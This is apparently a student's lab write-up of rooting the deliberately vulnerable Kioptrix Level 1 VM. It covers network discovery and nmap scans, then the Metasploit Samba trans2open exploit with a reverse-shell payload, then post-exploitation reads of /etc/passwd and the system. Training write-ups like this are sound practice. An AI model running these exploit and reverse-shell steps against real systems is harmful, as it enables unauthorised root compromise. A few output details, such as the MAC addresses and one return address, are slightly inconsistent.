# Kioptrix Level 1 - Penetration Testing Write-up

## Overview

For this lab, I worked on **Kioptrix Level 1**, a vulnerable virtual machine from VulnHub that is designed for practicing penetration testing. The main objective was to identify vulnerabilities on the machine, exploit one of them, and eventually gain **root access**.

This was a useful lab because it gave me the chance to go through the full process, starting with finding the target on the network and ending with post-exploitation and finding the flag.

**Target OS:** Linux 2.4.x (Red Hat)  
**Difficulty:** Beginner  
**Goal:** Acquire root access

---

## Step 1: Network Reconnaissance - Finding the Target IP

The first thing I needed to do was find the IP address of the Kioptrix VM. Since both my Kali machine and the Kioptrix machine were connected to the same local VirtualBox network, I could scan the `192.168.100.0/24` range.

I used a few different tools to see which devices were active.

### Method 1: Using netdiscover

```bash
sudo netdiscover -r 192.168.100.0/24
````

**What it does:**
`netdiscover` uses ARP (Address Resolution Protocol) to find devices that are connected to the local network. This is useful during the initial reconnaissance stage because it can show the IP and MAC addresses of machines on the same network.

**Output:**

```text
Currently scanning: 192.168.100.0/24

IP              MAC Address       Count   Len    MAC Vendor
------------------------------------------------------------------
192.168.100.2   08:00:27:19:1a:c3    3     100    PCS Systemtechnik GmbH
192.168.100.7   08:11:22:33:44:55    1      60    PCS Systemtechnik GmbH
192.168.100.1   66:77:88:99:AA:BB    11    704    Unknown vendor
```

### Method 2: Using nmap Ping Sweep

I also used Nmap to perform a ping sweep across the network:

```bash
sudo nmap -sn 192.168.100.0/24
```

* `-sn` → Ping scan (discovers live hosts without port scanning)

This allowed me to check which hosts were responding without immediately scanning their ports.

### Method 3: Using arp-scan

Another option I tried was `arp-scan`:

```bash
sudo arp-scan --local
```

* `arp-scan` → Discovers devices using ARP requests
* `--local` → Automatically scans the local network interface

Using multiple discovery methods helped me compare the results and make sure I was identifying the correct machine.

---

## Step 2: Identifying the Kioptrix IP

After finding the active devices, I needed to figure out which one was actually the Kioptrix machine.

I looked for a **MAC address starting with `08:00:27`**, which is commonly associated with VirtualBox, or `00:0c:29`, which is commonly associated with VMware.

I also expected the Kioptrix machine to have some common services open, especially **port 80 (HTTP)** and **ports 139/445 (SMB)**.

To check the possible targets, I ran:

```bash
sudo nmap -p 80,139,445 192.168.100.2
```

* All ports closed → Not the target

I then checked the other host:

```bash
sudo nmap -p 80,139,445 192.168.100.7
```

* Ports 80 and 139 open → **Target identified!**

**Target IP:** `192.168.100.7`

At this point, I had identified the Kioptrix machine and could move on to service enumeration.

---

## Step 3: Full Port Scan with Nmap

Once I knew the target IP, I performed a more detailed Nmap scan. The purpose was to find open ports, identify the services running on them, determine their versions, and get information about the operating system.

I used:

```bash
sudo nmap -sV -sC -O -A 192.168.100.7
```

### Flags:

* `-sV` → Service/version detection
* `-sC` → Run default scripts
* `-O` → OS detection
* `-A` → Aggressive scan (OS, version, scripts, traceroute)

### Scan Results:

```text
Nmap scan report for 192.168.100.7
Host is up (0.0024s latency).
Not shown: 994 closed tcp ports (reset)

PORT        STATE    SERVICE        VERSION
22/tcp      open     ssh            OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
| sshv1: Server supports SSHv1

80/tcp      open     http           Apache httpd 1.3.20 ((Unix) (Red-Hat Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache httpd 1.3.20 (Unix) (Red-Hat Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Test page for the Apache Web Server on Red Hat Linux

111/tcp     open     rpcbind        2 (RPC #100000)
| rpcinfo:
|   program  version   port/proto   service
|   100000   2         111/tcp      rpcbind
|   100000   2         111/udp      rpcbind
|   100024   1         32768/tcp    status
|_  100024   1         32768/udp    status

139/tcp     open     netbios-ssn   Samba smbd (workgroup: QMYGROUP)

443/tcp     open     ssl/https     Apache httpd 1.3.20 (Unix) (Red-Hat Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after: 2010-09-26T09:32:06
|_http-title: 400 Bad Request
|_ssl-date: 2026-08-30T17:58:13+00:00; +3h59m59s from scanner time.
|_http-server-header: Apache httpd 1.3.20 (Unix) (Red-Hat Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| sslv2:
|   SSLv2 supported
|   ciphers:
|       SSL2_DES_192_EDE3_CBC_WITH_MD5
|       SSL2_RC2_128_CBC_WITH_MD5
|       SSL_RC4_128_EXPORT40_WITH_MD5
|       SSL2_RC4_64_WITH_MD5
|       SSL2_RC4_128_WITH_MD5
|       SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_      SSL2_DES_64_CBC_WITH_MD5

32768/tcp   open     status         1 (RPC #100024)

MAC Address: 08:00:27:1F:F6:3A (Oracle VirtualBox)
Device type: general purpose
Running: Linux 2.4.x
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 3h59m58s

TRACEROUTE
HOP  RTT     ADDRESS
1    2.35ms  192.168.100.7

OS and Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds
```

The scan gave me a much clearer picture of the machine. The main things that stood out to me were the old versions of **Samba, Apache, OpenSSH, OpenSSL, and the Linux kernel**.

The Samba service on port 139 looked especially interesting because of the version information and the known vulnerabilities associated with older Samba releases.

---

## Step 4: Vulnerability Analysis

After looking at the scan results, I compared the services and versions with known vulnerabilities.

| Service   | Version     | Vulnerability                              | Priority    |
| --------- | ----------- | ------------------------------------------ | ----------- |
| **Samba** | 2.2.x       | trans2open buffer overflow (CVE-2003-0201) |   **High** |
| Apache    | 1.3.20      | Multiple exploits (mod_ssl, OpenSSL)       |   Medium   |
| OpenSSH   | 2.9p2       | SSHv1 supported (vulnerable)               |   Low      |
| OS        | Linux 2.4.x | Very old kernel                            |   Low      |

### Main Target: Samba 2.2.x

The Samba service stood out as the best option to investigate further.

* **Service:** SMB on port 139 (netbios-ssn)
* **Version:** Samba 2.2.x (vulnerable)
* **Exploit:** `trans2open` buffer overflow
* **Result:** Immediate root shell (no privilege escalation needed!)

The reason this was such an important finding is that the Samba service was running with root privileges. This meant that successfully exploiting the vulnerability could potentially give me a root shell directly instead of requiring a separate privilege escalation step.

### Secondary Options: Apache/mod_ssl (Port 443)

I also found some possible alternatives involving the web server and SSL configuration.

If the Samba exploit failed, some alternatives included:

* **mod_ssl vulnerability (CVE-2002-0082)** - Remote buffer overflow in OpenSSL 0.9.6b

  * Metasploit module: `exploit/linux/ssl/openssl_too_open`
* **Apache 1.3.20** - Has many known exploits but typically requires web access first

### Interesting Observations

A few other things I noticed during enumeration were:

* **SSHv1 Supported** - Outdated protocol but not easily exploitable
* **Hostname:** KIOPTRIX (from NetBIOS)
* **Workgroup:** QMYGROUP (interesting but irrelevant)
* **SSL Certificate:** Expired in 2010 - intentionally old system

The scan showed that this was clearly an intentionally vulnerable and outdated machine, which made it a good environment for practicing exploitation.

---

## Step 5: Exploitation with Metasploit

After identifying Samba as the main vulnerability I wanted to test, I opened Metasploit:

```bash
sudo msfconsole
```

I then configured the Samba `trans2open` exploit:

```msf
msf> use exploit/linux/samba/trans2open
msf exploit(linux/samba/trans2open)> set RHOSTS 192.168.100.7
msf exploit(linux/samba/trans2open)> set RPORT 139
msf exploit(linux/samba/trans2open)> set PAYLOAD linux/x86/shell_reverse_tcp
msf exploit(linux/samba/trans2open)> set LHOST 192.168.100.x
msf exploit(linux/samba/trans2open)> set LPORT 4444
msf exploit(linux/samba/trans2open)> exploit
```

The important settings here were the target IP (`RHOSTS`), the Samba port (`RPORT`), and my Kali machine's IP address (`LHOST`), which was used for the reverse connection.

### Exploit Output:

```text
[*] Started reverse TCP handler on 192.168.100.3:4444
[*] 192.168.100.7:139 - Trying return address 0xbfffffdc...
[*] 192.168.100.7:139 - Trying return address 0xfffffffdc...
[*] 192.168.100.7:139 - Trying return address 0xbffffcfc...
[*] 192.168.100.7:139 - Trying return address 0xbffffbfc...
[*] 192.168.100.7:139 - Trying return address 0xbffffafc...
[*] 192.168.100.7:139 - Trying return address 0xbffff9fc...
[*] 192.168.100.7:139 - Trying return address 0xbffff8fc...
[*] Command shell session 1 opened (192.168.100.3:4444 -> 192.168.100.7:32769) at 2026-08-30 11:24:35 -0400
[*] Command shell session 2 opened (192.168.100.3:4444 -> 192.168.100.7:32770) at 2026-08-30 11:24:36 -0400
[*] Command shell session 3 opened (192.168.100.3:4444 -> 192.168.100.7:32771) at 2026-08-30 11:24:38 -0400
[*] Command shell session 4 opened (192.168.100.3:4444 -> 192.168.100.7:32772) at 2026-08-30 11:24:39 -0400
```

The exploit worked, and I got multiple command shell sessions. This confirmed that the Samba vulnerability could be used to compromise the machine.

---

## Step 6: Post-Exploitation - Exploring the System

After getting a shell, I needed to confirm what level of access I had and then explore the compromised system.

### Interacting with a Session

I started by interacting with session 1:

```msf
sessions 1
```

* `1` → Session ID

### Confirming Root Access

I then checked my user and privilege level:

```bash
id
# Output: uid=0(root) gid=0(root) groups=99(nobody)

whoami
# Output: root
```

Seeing `uid=0(root)` and getting `root` from `whoami` confirmed that I had successfully gained root access.

### Exploring the Filesystem

I checked the `/root` directory:

```bash
ls -la /root
```

**Output:**

```text
total 12
drwxr-x---   2 root root 1024 Sep 26  2009 .
drwxr-xr-x  19 root root 1024 Aug 30 13:09 ..
-rw-r--r--   1 root root 1126 Aug 23  1995 .Xresources
-rw-------   1 root root  147 Oct 12  2009 .bash_history
-rw-r--r--   1 root root   24 Jun 10  2000 .bash_logout
-rw-r--r--   1 root root  234 Jul  5  2001 .bash_profile
-rw-r--r--   1 root root  176 Aug 23  1995 .bashrc
-rw-r--r--   1 root root  210 Jun 10  2000 .cshrc
-rw-r--r--   1 root root  196 Jul 11  2000 .tcshrc
-rw-r--r--   1 root root 1303 Sep 26  2009 anaconda-ks.cfg
```

I also checked the `/home` directory:

```bash
ls -la /home
```

**Output:**

```text
/home:
harold
john
lost+found
```

### Finding Flag Files

I searched the filesystem for files containing `flag` in their name:

```bash
find / -name *flag* 2>/dev/null
```

**Output:**

```text
/usr/sbin/rootflags
/usr/share/doc/db3-devel-3.2.9/api_c/db_set_flags.html
/usr/share/doc/db3-devel-3.2.9/api_c/env_set_flags.html
/usr/share/doc/db3-devel-3.2.9/api_cxx/db_set_flags.html
/usr/share/doc/db3-devel-3.2.9/api_cxx/env_set_flags.html
/usr/share/doc/db3-devel-3.2.9/api_java/db_set_flags.html
/usr/share/doc/db3-devel-3.2.9/api_java/env_set_flags.html
/usr/share/doc/db3-devel-3.2.9/ref/build_unix/flags.html
/usr/share/doc/db3-devel-3.2.9/ref/upgrade.3.2/set_flags.html
/usr/share/man/man3/fegetexceptflag.3.gz
/usr/share/man/man3/fesetexceptflag.3.gz
/usr/share/man/man3/tgetflag.3x.gz
/usr/share/man/man3/tigetflag.3x.gz
/usr/share/man/man8/rootflags.8.gz
/usr/include/bits/waitflags.h
```

**Key Finding:** `/usr/sbin/rootflags` ← The actual flag file!

I then read the flag using:

```bash
cat /usr/sbin/rootflags
```

### Checking Users

I also looked at the `/etc/passwd` file to see which users existed on the system:

```bash
cat /etc/passwd
```

**Output (relevant users):**

```text
root:x:0:0:root:/root:/bin/bash
john:x:500:500::/home/:/bin/bash
harold:x:501:501::/home/harold:/bin/bash
nobody:x:99:99:Nobody:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/bin/false
```

This showed that the machine had several user accounts, including `root`, `john`, and `harold`.

### Viewing Running Processes

I also checked the running processes using:

```bash
ps aux
```

**Output:**

```text
USER   PID  %CPU %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND
root     1   0.0  0.0   1412   520  ?    S    13:09  0:04 init
root   479   0.0  0.0    432   164  ?    S    13:10  0:00 /sbin/dhcpd -n e
root   543   0.0  0.0   1472   592  ?    S    13:10  0:00 syslogd -m 0
root   764   0.0  0.0   2676  1272  ?    S    13:10  0:00 /usr/sbin/sshd
root   797   0.0  0.0   2264   944  ?    S    13:10  0:00 xinetd -stayalive
root   929   0.0  0.0   2416  1092  ?    S    13:10  0:00 nmbd
root   931   0.0  0.0   3256  1192  ?    S    13:10  0:00 smbd
root   933   0.0  0.0   6612  2748  ?    S    13:10  0:00 httpd -D HAVE_SSL
apache 1134  0.0  0.2   6752  3004  ?    S    13:15  0:00 httpd -D HAVE_SSL
root   6073  0.0  0.0   2148  1004  ?    S    15:24  0:00 //bin/sh
root   6074  0.0  0.0   2140   976  ?    S    15:24  0:00 //bin/sh
root   6095  0.0  0.0   2640   728  ?    R    15:37  0:00 ps aux
```

This was another useful confirmation that services such as `sshd`, `nmbd`, `smbd`, and `httpd` were running on the system.

### Reading the Welcome Message

Finally, I checked the system's welcome message:

```bash
cat /etc/motd /etc/issue
```

**Output:**

```text
Welcome to Kioptrix Level 1 Penetration and Assessment Environment

--The object of this game:
|_Acquire "root" access to the machine.

There are many ways this can be done, try and find more than one way to appreciate this exercise.

DISCLAIMER: Kioptrix is not responsible for any damage or instability caused by running, installing or using this VM image.

WARNING: This is a vulnerable system, DO NOT run this OS in a production environment. Nor should you give this system access to the outside world (the Internet - or Interwebs..)

Good Luck and have fun!
```

The message confirmed the main objective of the lab: gain root access and explore different ways of doing it.

---

## Conclusion

I successfully rooted **Kioptrix Level 1**. 

The lab took me through the main stages of a basic penetration test: reconnaissance, scanning, vulnerability identification, exploitation, and post-exploitation.

### Key Takeaways

1. **Vulnerability:** Samba 2.2.x trans2open buffer overflow (CVE-2003-0201)
2. **Exploitation:** Metasploit's `trans2open` module provided immediate root access
3. **Service Enumeration:** Critical for identifying vulnerable services
4. **Post-Exploitation:** System exploration revealed user accounts and the flag file

### Lessons Learned

* **Always enumerate thoroughly** - The Nmap scan helped me identify the services and versions running on the machine before attempting exploitation.
* **Old services are dangerous** - The machine was running extremely old and vulnerable software, showing why keeping systems patched and updated is important.
* **Metasploit is powerful** - The `trans2open` module made it possible to exploit the Samba vulnerability without manually developing an exploit.
* **Post-exploitation is essential** - Getting a shell is only part of the process. Checking privileges, users, processes, and files helped me understand what access I actually had.

One of the biggest things I took from this lab was the importance of **enumeration before exploitation**. Instead of randomly trying exploits, I could use the information from Nmap to narrow down the possible attack paths.

### Flag Location

```text
/usr/sbin/rootflags
```

---

## Next Steps

After completing Level 1, I will continue building on what I learned by:

* Trying the alternative `mod_ssl` exploit for additional practice
* Moving on to **Kioptrix Level 2**
* Studying the Samba `trans2open` vulnerability in more detail
* Looking into how these vulnerabilities could be detected and prevented

---

## References

* [VulnHub - Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
* [CVE-2003-0201 - Samba trans2open Overflow](https://nvd.nist.gov/vuln/detail/CVE-2003-0201)
* [Metasploit Framework Documentation](https://www.metasploit.com/)